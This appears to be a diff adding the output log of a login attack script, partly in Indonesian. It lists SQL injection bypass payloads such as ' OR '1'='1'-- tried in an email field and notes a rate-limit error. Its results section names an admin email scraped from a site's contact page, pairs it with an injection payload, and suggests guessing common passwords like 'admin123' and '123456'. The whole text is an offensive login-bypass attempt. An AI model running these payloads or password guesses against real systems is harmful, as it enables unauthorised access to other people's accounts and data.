@@ -1,0 +1,18 @@
+[*] Testing payloads:
+  [email] admin@example.com' OR '1'='1'--
+  [email] admin@test.com'--
+  [email] 1' OR '1'='1'--
+  [email] x'--
+  [email] ' OR '1'='1' -- 
+
+[*] Admin email login:
+
+[*] SQLi with admin email:
+  Error: HTTP Error 429: Too Many Requests
+
+=== HASIL ===
+📧 Email admin: nama@email.com
+   (ditemukan di halaman /contact)
+
+🔑 SQLi payload: nama@email.com' OR '1'='1'--
+🔑 Password: coba 'admin123', 'password', '123456'
